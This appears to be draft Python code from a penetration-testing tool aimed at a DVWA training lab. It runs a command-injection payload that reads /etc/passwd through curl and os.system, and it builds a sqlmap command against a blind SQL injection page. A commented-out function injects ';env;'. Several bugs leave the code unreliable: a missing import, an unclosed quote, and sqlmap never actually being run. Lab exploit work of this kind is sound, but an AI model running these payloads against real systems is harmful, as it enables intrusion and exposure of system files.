import os
import logging


#TODO standard attack result output
# TODO one of the thigns to print in the end perhaps file location
def attack_manual_command_exec_passwd(vuln, host, cookie=None):
    start = time.time()
    url = host + vuln["path"]
    param = vuln["parameter"]
    # host = "http://192.168.40.132/"
    # path = "/dvwa/vulnerabilities/exec/"
    # param = "ip"
    payload = "%3Bcat /etc/passwd%3B&submit=submit"
    # full_path = host+path
    cookie = "PHPSESSID=31bfb288d74780b526cdf950d6246ac4;security=low"
    # url = "http://192.168.40.132/dvwa/vulnerabilities/exec/"
    output_file = "./results/exec_pw_out_{}".format(1)
    # TODO if cookie and if output
    attack_str = "curl \"{url}\" -e \"{url}\" -d \"{param}={payload}\" --cookie \"{cookie}"
    attack_str = attack_str.format(
        url=url,
        param=param,
        payload=payload,
        cookie=cookie
    )

    logging.info("Execuring command execussion attack with {}".format(attack_str))
    os.system(attack_str+">"+output_file)

    with open(output_file, 'r') as f:
        output = f.read()
    end = time.time()
    success = False #TODO

    result = {
        "stage":3, 
        "time":end-start, 
        "settings": attack_str,
        "result_file": output_file,
        "success": success
    }
    return result

def sql_manual(vuln, host, cookie=None):
    #TODO if cookie and if output
    start = time.time()
    url = "http://192.168.40.132/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"
    cookie = "PHPSESSID=31bfb288d74780b526cdf950d6246ac4;security=low"
    output_file = "./results/sqlmap_out_{}".format(1)
    attack_str = "sqlmap -u \"{url}\" --cookie=\"{cookie}\" --flush-session --batch --answers=\"\" --output-dir={output}".format(
        url = url,
        cookie = cookie,
        output= output_file
    )
    with open(output_file, 'r') as f:
        output = f.read()
    success = False
    if output !=None: # TODO file not empty
        success = True
    end = time.time()
    result = {
        "stage":3, # TODO its ok for these to be formatted uniquely but maybe make it a type or a class
        "time":end-start, 
        "settings": attack_str,
        "result_file": output_file,
        "success": success
    }
    return result


# def command_exec_manual():
#     host = "http://192.168.40.132/"
#     path = "/dvwa/vulnerabilities/exec/"
#     param = "ip"
#     http_request =  "POST /dvwa/vulnerabilities/exec/ HTTP/1.1\nHost: 192.168.40.132\nReferer: http://192.168.40.132/dvwa/vulnerabilities/exec/\nContent-Type: application/x-www-form-urlencoded\n\nip=%3Benv%3B&submit=submit"
#     curl_command = "curl \"http://192.168.40.132/dvwa/vulnerabilities/exec/\" -e \"http://192.168.40.132/dvwa/vulnerabilities/exec/\" -d \"ip=%3Benv%3B&submit=submit\""
# def cross_site_script_manual():

